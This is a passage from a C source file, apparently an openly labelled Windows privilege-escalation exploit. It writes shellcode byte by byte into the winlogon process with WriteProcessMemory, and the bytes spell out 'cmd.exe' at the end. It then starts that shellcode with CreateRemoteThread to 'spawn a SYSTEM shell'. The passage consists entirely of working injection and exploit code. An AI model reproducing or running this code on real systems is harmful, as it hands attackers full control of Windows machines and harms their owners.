	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 181), "\x5a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 182), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 183), "\x83", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 184), "\xec", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 185), "\x20", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 186), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 187), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 188), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 189), "\xe0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 190), "\x58", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 191), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 192), "\x59", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 193), "\x5a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 194), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 195), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 196), "\x12", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 197), "\xe9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 198), "\x57", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 199), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 200), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 201), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 202), "\x5d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 203), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 204), "\xba", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 205), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 206), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 207), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 208), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 209), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 210), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 211), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 212), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 213), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 214), "\x8d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 215), "\x8d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 216), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 217), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 218), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 219), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 220), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 221), "\xba", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 222), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 223), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 224), "\x6f", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 225), "\x87", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 226), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 227), "\xd5", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 228), "\xbb", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 229), "\xe0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 230), "\x1d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 231), "\x2a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 232), "\x0a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 233), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 234), "\xba", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 235), "\xa6", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 236), "\x95", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 237), "\xbd", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 238), "\x9d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 239), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 240), "\xd5", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 241), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 242), "\x83", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 243), "\xc4", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 244), "\x28", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 245), "\x3c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 246), "\x06", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 247), "\x7c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 248), "\x0a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 249), "\x80", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 250), "\xfb", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 251), "\xe0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 252), "\x75", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 253), "\x05", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 254), "\xbb", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 255), "\x47", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 256), "\x13", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 257), "\x72", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 258), "\x6f", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 259), "\x6a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 260), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 261), "\x59", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 262), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 263), "\x89", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 264), "\xda", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 265), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 266), "\xd5", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 267), "\x63", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 268), "\x6d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 269), "\x64", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 270), "\x2e", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 271), "\x65", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 272), "\x78", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 273), "\x65", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 274), "\x00", 1, (SIZE_T *)&BytesReturned);

	printf("\t[+] Spawning SYSTEM shell\n");
	if (!CreateRemoteThread(winlogon_handle, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteAllocation, NULL, 0, NULL))
	{
		printf("\t[-] CreateRemoteThread Failed! Did you compile the exploit as a 64-bit executable ?\n");
		return 0;
	}
}
